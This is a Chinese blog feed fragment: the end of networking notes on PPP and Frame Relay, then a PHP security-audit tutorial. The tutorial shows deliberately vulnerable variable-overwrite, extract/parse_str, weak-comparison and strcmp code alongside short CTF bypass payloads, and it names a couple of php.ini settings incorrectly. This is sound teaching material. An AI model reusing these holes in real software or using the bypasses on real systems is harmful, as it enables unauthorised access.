和 LCP 两个部分</li><li>广泛用于宽带连接，Internet 连接</li></ul><h3 id="PPP-LCP-Options"><a href="#PPP-LCP-Options" class="headerlink" title="PPP LCP Options"></a>PPP LCP Options</h3><ul><li>Authentication：二层认证机制</li><li>Callback：回拨</li><li>Compression：二层压缩机制</li><li>Multilink：多链路</li></ul><h3 id="Laying-PPP-Elements"><a href="#Laying-PPP-Elements" class="headerlink" title="Laying PPP Elements"></a>Laying PPP Elements</h3><p>LCP : 底层协议，用于建立连接、解除连接和连接认证</p><p>NCP : 上层协议，在三层和底层之间做一个衔接</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/34.png" alt></p><h3 id="PAP"><a href="#PAP" class="headerlink" title="PAP"></a>PAP</h3><ul><li>PPP authentication protocol</li><li>Passwords sent in plaintext</li></ul><blockquote><p>单向认证，一方请求认证，一方提交用户名密码</p></blockquote><h3 id="CHAP"><a href="#CHAP" class="headerlink" title="CHAP"></a>CHAP</h3><ul><li>PPP authentication protocol</li><li>Hash values, not actual passwords, are sent across the link</li></ul><blockquote><p>双方都要进行认证，一个类似于三次握手的过程</p></blockquote><h1 id="Frame-Relay"><a href="#Frame-Relay" class="headerlink" title="Frame Relay"></a>Frame Relay</h1><h2 id="Features-3"><a href="#Features-3" class="headerlink" title="Features"></a>Features</h2><ul><li>帧中继协议是二层协议</li><li>早期企业用于替代专线线路的方法</li><li>长距离传输</li><li>使用了虚拟电路(virtual circuits)，将一个线路分为多个虚拟线路，分别分给用户，使用 VC 区分不同用户 </li><li>不支持广播和组播，只支持单播</li></ul><h2 id="Frame-Relay-Terminology"><a href="#Frame-Relay-Terminology" class="headerlink" title="Frame Relay Terminology"></a>Frame Relay Terminology</h2><ul><li>VC 分为 SVC(交换虚链路，临时分配地址) 和 PVC(永久虚链路，固定地址)</li><li>帧中继通过 DLCI 号标识 VC，可以把 DLCI 理解为帧中继的二层编址，只具有本地意义，即只存在于两个设备之间，可以重复</li><li>帧中继封装分为 Cisco 和 IETF 封装</li><li>LMI( 本地管理接口 ) : 两个帧中继设备之间使用的信令标准，可以理解为两种设备之间所说的语言</li></ul><h2 id="Address-Mapping"><a href="#Address-Mapping" class="headerlink" title="Address Mapping"></a>Address Mapping</h2><ul><li>三层使用 IP 地址，二层使用 DLCI 号，这样就存在一个从 IP 地址到 DLCI 号的映射</li><li>这个映射使用 Inverse ARP 来实现动态映射</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ACL&quot;&gt;&lt;a href=&quot;#ACL&quot; class=&quot;headerlink&quot; title=&quot;ACL&quot;&gt;&lt;/a&gt;ACL&lt;/h1&gt;&lt;h2 id=&quot;Features&quot;&gt;&lt;a href=&quot;#Features&quot; class=&quot;headerlink&quot; title=&quot;Featu
      
    
    </summary>
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="http://yoursite.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计(一)</title>
    <link href="http://yoursite.com/2019/06/03/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2019/06/03/PHP代码审计基础/</id>
    <published>2019-06-03T10:58:57.814Z</published>
    <updated>2019-06-25T14:39:51.666Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见-PHP-框架"><a href="#常见-PHP-框架" class="headerlink" title="常见 PHP 框架"></a>常见 PHP 框架</h1><ul><li>ThinkPHP</li><li>Yaf</li><li>Laravel</li><li>Kohana</li><li>Codelgniter</li><li>Yii</li><li>Smyfony</li><li>doitphp</li></ul><blockquote><p>先看用户手册</p></blockquote><h1 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h1><p>获取请求 =》全局过滤 =》模块文件 =》C函数内容 =》M函数内容 =》V显示</p><h1 id="网站目录结构"><a href="#网站目录结构" class="headerlink" title="网站目录结构"></a>网站目录结构</h1><ul><li><p>主目录</p></li><li><p>模块目录</p></li><li><p>插件目录</p></li><li><p>上层目录</p></li><li><p>模板目录</p></li><li><p>数据目录</p></li><li><p>配置目录</p></li><li><p>配置文件</p></li><li><p>公共函数文件</p></li><li><p>安全过滤文件</p></li><li><p>数据库结构</p></li><li><p>入口文件</p></li></ul><h1 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h1><h2 id="通读原文"><a href="#通读原文" class="headerlink" title="通读原文"></a>通读原文</h2><ul><li>函数集文件</li><li>配置文件</li><li>安全过滤文件</li><li>index 文件</li></ul><blockquote><p>适用于比较小的网站或者 CMS</p></blockquote><h2 id="敏感关键字回溯参数"><a href="#敏感关键字回溯参数" class="headerlink" title="敏感关键字回溯参数"></a>敏感关键字回溯参数</h2><p>这是常见方法，但是不能了解程序的基本框架，覆盖不了逻辑漏洞</p><h2 id="查找可控变量"><a href="#查找可控变量" class="headerlink" title="查找可控变量"></a>查找可控变量</h2><ul><li><p>可控变量</p></li><li><p>进入函数的变量</p></li></ul><h2 id="功能点定向审计"><a href="#功能点定向审计" class="headerlink" title="功能点定向审计"></a>功能点定向审计</h2><ul><li>程序安装</li><li>文件上传</li><li>文件管理</li><li>登陆验证</li><li>备份恢复</li><li>找回密码</li></ul><h1 id="PHP核心配置"><a href="#PHP核心配置" class="headerlink" title="PHP核心配置"></a>PHP核心配置</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><ul><li>大小写敏感</li><li>运算符：|, &amp;, ~, !</li><li>空值：foo = ; 或者 foo = none;</li></ul><h2 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h2><ul><li><p>安全模式</p><p><code>safe_mode = off</code></p><p>限制文档的存取，限制环境变量的存取，控制外部程序的执行</p><p>在 PHP5.4.0 被移除</p></li><li><p>限制环境变量存取</p><p><code>safe_mode_allowed_env_vars = string</code></p><p>指定 PHP 程序可以改变的环境变量的前缀</p></li><li><p>外部程序执行目录</p><p><code>safe_mode_exec_dir = &quot;path&quot;</code></p></li><li><p>禁用函数</p><p><code>disable_functions =</code> </p></li></ul><h2 id="控制变量"><a href="#控制变量" class="headerlink" title="控制变量"></a>控制变量</h2><ul><li><p>全局变量注册开关</p><p><code>register_globals = off</code></p><p>off 时服务端使用 $_GET[‘name’] 获取数据，on 时服务端通过 POST 或 GET 提交的数据将使用全局变量来接收</p></li><li><p>魔术引号自动过滤</p><p><code>magic_quotes_gpc = on</code></p><p>在 PHP5.4.0 被移除</p></li></ul><h2 id="远程文件"><a href="#远程文件" class="headerlink" title="远程文件"></a>远程文件</h2><ul><li><p>是否允许包含远程文件</p><p><code>allow_url_include = off</code></p></li><li><p>是否允许打开远程文件</p><p><code>allow_url_open = off</code></p></li></ul><h2 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h2><ul><li><p>HTTP 头部版本信息</p><p><code>expose_http = off</code></p></li><li><p>文件上传临时目录</p><p><code>upload_tmp_dir =</code> </p></li><li><p>用户可访问目录</p><p><code>open_basedir = path</code></p></li></ul><h2 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h2><ul><li><p>内部错误选项</p><p><code>display_errors = on</code></p></li><li><p>错误报告级别</p><p><code>error_reporting = E_ALL&amp;~E_NOTICE</code></p></li></ul><h1 id="审计中涉及的超全局变量"><a href="#审计中涉及的超全局变量" class="headerlink" title="审计中涉及的超全局变量"></a>审计中涉及的超全局变量</h1><ul><li><p>全局变量</p><p>在函数外面定义的变量，不能在函数中直接使用。在函数中使用时加上global</p></li><li><p>超全局变量</p><p>作用域在所有脚本，比如$_GET，$_SERVER。除$_GET, $_POST, $_SERVER, $_COOKIE等之外的超全局变量保存在 $GLOBALS 数组中</p></li></ul><h2 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h2><ul><li><p>global</p><p>定义全局变量，只应用于当前网页而不是整个网站，可以视为参数的传递</p></li><li><p>$GLOBALS</p><p>在 PHP 脚本中的任意位置访问全局变量，可以视为变量的作用域设置全局</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$var1 = <span class="number">1</span>;</span><br><span class="line">$var2 = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">'var1'</span>] = $GLOBALS[<span class="string">'var2'</span>];</span><br><span class="line">&#125;</span><br><span class="line">test1();</span><br><span class="line"><span class="keyword">echo</span> $var1;<span class="comment">//2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $var1,$var2;</span><br><span class="line">$var1 = $var2</span><br><span class="line">&#125;</span><br><span class="line">test2();</span><br><span class="line"><span class="keyword">echo</span> $var1;<span class="comment">//2</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="POST-和-GET"><a href="#POST-和-GET" class="headerlink" title="$_POST 和 $_GET"></a>$_POST 和 $_GET</h2><ul><li><p>POST</p><p>隐藏传参，将表单内各个字段与其内容放在 Request Header 内传给服务器</p></li><li><p>GET</p><p>URL 传参，将参数放在提交表单的 ACTION 属性所指的 URL 中</p></li></ul><h2 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h2><ul><li>PHP 中 $_REQUEST 可以获取 以 POST 和 GET 方法提交的数据</li><li>尽量不要使用</li></ul><h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><ul><li>这种超全局变量保存关于报头、路径和脚本位置的信息</li><li>数组</li></ul><h2 id="FILE"><a href="#FILE" class="headerlink" title="$_FILE"></a>$_FILE</h2><ul><li>保存上传文件的信息</li><li>数组</li></ul><h2 id="SESSION"><a href="#SESSION" class="headerlink" title="$_SESSION"></a>$_SESSION</h2><ul><li>保存 SESSION 信息</li><li>数组</li></ul><h2 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$_COOKIE"></a>$_COOKIE</h2><ul><li>保存 COOKIE 信息</li><li>数组</li></ul><h2 id="ENV"><a href="#ENV" class="headerlink" title="$_ENV"></a>$_ENV</h2><ul><li>包含服务器环境变量的数组</li><li>只是被动的接受服务器端的环境变量转换为数组</li></ul><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><ul><li>变量未初始化，我们自定义的参数值可以替换程序原有的变量值</li></ul><h2 id><a href="#" class="headerlink" title="$$"></a>$$</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x = <span class="string">'123'</span>;</span><br><span class="line">$b = <span class="string">'456'</span>;</span><br><span class="line"></span><br><span class="line">$x = $_GET[<span class="string">'x'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$x);"</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($x);"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>变量 x 初始化为 ‘123’</p><p>传入参数 ?x=b，$$x 就相当于 $b，这时的输出为 string(3) “456”，string(1) “b”</p><p>传入参数 ?x=x=789，$$x 相当于 ${x=789}，这时输出为 int(789)，int(789)，x 值以被覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line">$_403 = <span class="string">"Access Denied"</span>;</span><br><span class="line">$_200 = <span class="string">"Welcome Admin"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"CTF is here :p…"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</span><br><span class="line">    <span class="keyword">die</span>($_403);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    $$key = $$value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    $$key = $value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</span><br><span class="line">    <span class="keyword">die</span>($_403);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is your flag : "</span>. $flag . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($_200);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：?_200=flag post：flag=1</p><p>通过 $$key=$$value 将 flag 的值赋给 _200，post 中的 flag 为：${flag}=1，所以 post 的值永远和 $flag 相同，接着利用 die($_200) 将真实的 flag 输出</p><h2 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h2><blockquote><p>extract(<em>array,extract_rules,prefix</em>)</p></blockquote><p>extract() 函数使用数组键名作为变量名，使用数组键值作为变量值，创建这些变量。该函数返回成功设置的变量数目。</p><p>extract_rules 参数：</p><ul><li>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</li><li>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</li><li>EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。</li><li>EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。</li><li>EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。</li><li>EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</li><li>EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</li><li>EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"Original"</span>;</span><br><span class="line">$my_array = <span class="keyword">array</span>(<span class="string">"a"</span> =&gt; <span class="string">"Cat"</span>, <span class="string">"b"</span> =&gt; <span class="string">"Dog"</span>, <span class="string">"c"</span> =&gt; <span class="string">"Horse"</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">extract($my_array);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\$a = $a; \$b = $b; \$c = $c"</span>;</span><br><span class="line"><span class="comment">//Original $a = Cat; $b = Dog; $c = Horse</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REQUEST_METHOD"</span>]==<span class="string">"POST"</span>)&#123;</span><br><span class="line">    extract($_POST);</span><br><span class="line">    <span class="keyword">if</span>($pass == $password_hard)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"peri0d"</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：post：pass=123&amp;password_hard=123</p><p>传入的 $_POST 是一个数组，为 <code>array(2) {[&quot;pass&quot;]=&gt;string(3) &quot;123&quot; [&quot;password_hard&quot;]=&gt;string(3) &quot;123&quot;}</code></p><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h2><blockquote><p>parse_str(<em>string,array</em>)</p></blockquote><p>parse_str() 函数把查询字符串解析到变量中。如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name = <span class="string">'peri0d'</span>;</span><br><span class="line">parse_str(<span class="string">'name=peri0d_2&amp;sex=1'</span>);</span><br><span class="line"><span class="keyword">echo</span> $name.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sex;</span><br><span class="line"><span class="comment">//peri0d_21</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'x'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">    $m = <span class="string">"guest"</span>;</span><br><span class="line">    $x = $_GET[<span class="string">'x'</span>];</span><br><span class="line">    @parse_str($x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($m[<span class="number">0</span>] == <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"so easy!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：?x=m[0]=admin</p><p>parse_str($x) 即为 parse_str(m[0]=admin)，实现变量覆盖。</p><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><ul><li>序列化：把一个复杂的数据类型压缩为一个字符串</li><li>反序列化：把一个字符串恢复成复杂的数据类型</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$x = &quot;peri0d 2019&quot;;</span><br><span class="line">$y = array(&quot;peri0d&quot;,2019);</span><br><span class="line">echo serialize($x).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo serialize($y);</span><br><span class="line">//s:11:&quot;peri0d 2019&quot;;</span><br><span class="line">//a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;i:2019;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ul><li>反序列化对象中存在魔术方法，而且魔术方法中的代码可以被控制，漏洞根据不同的代码可以导致各种攻击</li><li>unserialize 函数的变量可控</li><li>php 文件存在可利用的类，类中有魔术方法</li></ul><h2 id="序列化的不同结果"><a href="#序列化的不同结果" class="headerlink" title="序列化的不同结果"></a>序列化的不同结果</h2><ul><li>public</li><li>private</li><li>protect</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $x = <span class="string">"peri0dx"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $y = <span class="string">"peri0dy"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $z = <span class="string">"peri0dz"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($t);</span><br><span class="line"><span class="comment">//O:4:"test":3:&#123;s:7:"testx";s:7:"peri0dx";s:1:"y";s:7:"peri0dy";s:4:"*z";s:7:"peri0dz";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ul><li>construct() : 当一个类被创建时自动调用</li><li>destruct() : 当一个类被销毁时自动调用</li><li>invoke() : 当把一个类当作函数使用时自动调用</li><li>toString() : 当把一个类当作字符串使用时自动调用</li><li>wakeup() : 当调用unserialize()函数时自动调用</li><li>sleep() : 当调用serialize()函数时自动调用</li><li>call() : 当要调用的方法不存在或权限不足时自动调用</li><li>get() : 这个方法用来获取私有成员属性值的,有一个参数，参数传入你要获取的成员属性的名称，返回获取的属性值</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/magic_method.png" alt></p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>CVE-2016-7124</p><h1 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h1><h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><ul><li>标准类型：布尔，整型，浮点，字符</li><li>复杂类型：数据，对象</li><li>特殊类型：资源</li></ul><h2 id="操作之间的比较"><a href="#操作之间的比较" class="headerlink" title="操作之间的比较"></a>操作之间的比较</h2><ol><li><p>字符串和数字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="number">0</span> == <span class="string">"admin"</span>);    <span class="comment">//T</span></span><br><span class="line">var_dump(<span class="string">"1admin"</span> == <span class="number">1</span>);   <span class="comment">//T</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span> == <span class="number">1</span>);   <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span> == <span class="number">0</span>);   <span class="comment">//T</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>数字和数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>();</span><br><span class="line">var_dump(<span class="number">0</span> == $arr);    <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="number">123</span> == $arr);  <span class="comment">//F</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>字符串和数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>();</span><br><span class="line">var_dump(<span class="string">'0'</span> == $arr);    <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="string">'123'</span> == $arr);  <span class="comment">//F</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>“合法数字+e+合法数字” 类型的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">"0e1234"</span> == <span class="string">"0e56789"</span>);   <span class="comment">//T</span></span><br><span class="line">var_dump(<span class="string">"1e1123"</span> == <span class="string">"10"</span>);        <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="string">"1e1"</span> == <span class="string">"10"</span>);           <span class="comment">//T</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>== 和 ===</p><p>在PHP里面    ==   比较指比较值，不同类型会转换成同一类型比较。用   ===   比较时，必须值和类型都一样才为true</p></li></ol><h2 id="empty-与-isset"><a href="#empty-与-isset" class="headerlink" title="empty 与 isset"></a>empty 与 isset</h2><ul><li>变量为：0, “0”, null, false, array() 时，使用 empty 函数，返回值为 true</li><li>变量未定义或为 null 时，isset 函数返回 false，其他都返回 true</li></ul><h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5 函数"></a>md5 函数</h2><p>传入数组进行比较时全为 true</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr1 = <span class="keyword">array</span>(<span class="string">'test1'</span>, <span class="string">'test2'</span>, <span class="string">'2019'</span>);</span><br><span class="line">$arr2 = <span class="keyword">array</span>(<span class="string">'test3'</span>, <span class="string">'test4'</span>, <span class="string">'2019'</span>);</span><br><span class="line">var_dump(md5($arr1) == md5($arr2));    <span class="comment">//T</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="strcmp-函数"><a href="#strcmp-函数" class="headerlink" title="strcmp 函数"></a>strcmp 函数</h2><blockquote><p>strcmp(<em>string1</em>, <em>string2</em>)</p></blockquote><p>比较 string1 和 string2。如果相等返回 0；如果 string1 小于 string2，返回 &lt;0；如果 string1 大于 string2，返回 &gt;0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass = <span class="string">'123456'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pwd'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strcmp($_GET[<span class="string">'pwd'</span>], $pass) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'fail'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：?pwd[]=1</p><h2 id="in-array-与-array-search"><a href="#in-array-与-array-search" class="headerlink" title="in_array() 与 array_search()"></a>in_array() 与 array_search()</h2><p><strong>in_array()</strong> 函数搜索数组中是否存在指定的值。如果在数组中找到值则返回 TRUE，否则返回 FALSE。</p><blockquote><p>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</p></blockquote><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/in_array.png" alt></p><p><strong>array_search()</strong> 